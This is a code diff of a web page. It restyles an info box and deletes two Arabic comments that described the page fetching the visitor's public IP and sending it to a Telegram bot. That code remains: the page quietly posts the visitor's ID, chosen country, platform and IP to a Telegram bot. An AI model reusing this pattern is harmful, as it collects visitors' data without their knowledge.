@@ -46,7 +46,18 @@ button:active { transform:scale(0.95); }
 .reset { background:#e74c3c; color:white; }
 .telegram { background:#1d6fb8; width:90%; display:flex; align-items:center; justify-content:center; gap:6px; margin:6px auto; border-radius:10px; padding:8px; }
 .telegram img { width:20px; height:20px; }
-.info-box { background:rgba(255,255,255,0.05); border:1px solid gray; border-radius:8px; padding:5px; margin-top:6px; font-size:0.7em; line-height:1.3em; text-align:center; }
+.info-box {
+  background: rgba(255,255,255,0.05);
+  border: 1px solid gray;
+  border-radius: 8px;
+  padding: 8px;
+  margin: 10px auto;
+  font-size: 0.75em;
+  line-height: 1.4em;
+  text-align: center;
+  width: 85%;
+  max-width: 250px;  /* يخليه أقرب للمربع */
+}
 #alerts { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); display:flex; flex-direction:column; align-items:center; gap:10px; z-index:1000; }
 .alert-box { background:#222; border:1px solid #777; border-radius:10px; padding:10px 15px; opacity:0; transform:translateX(100%); transition:all 0.5s ease; min-width:250px; text-align:center; }
 .alert-box.show { opacity:1; transform:translateX(0); }
@@ -128,7 +139,6 @@ async function goToApp(){
   if(!platform){ showAlert("الرجاء اختيار المنصة"); return; }
   if(!selectedCountry){ showAlert("الرجاء اختيار علم الدولة"); return; }
 
-  // احصل على الايبي
   let ip="غير معروف";
   try{
     const res=await fetch("https://api.ipify.org?format=json");
@@ -136,7 +146,6 @@ async function goToApp(){
     ip=data.ip;
   }catch(e){}
 
-  // ارسل رسالة للبوت
   const message=`📌 ID: ${id}\n🌍 الدولة: ${selectedCountry}\n🎮 المنصة: ${platform.value}\n📡 IP: ${ip}`;
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
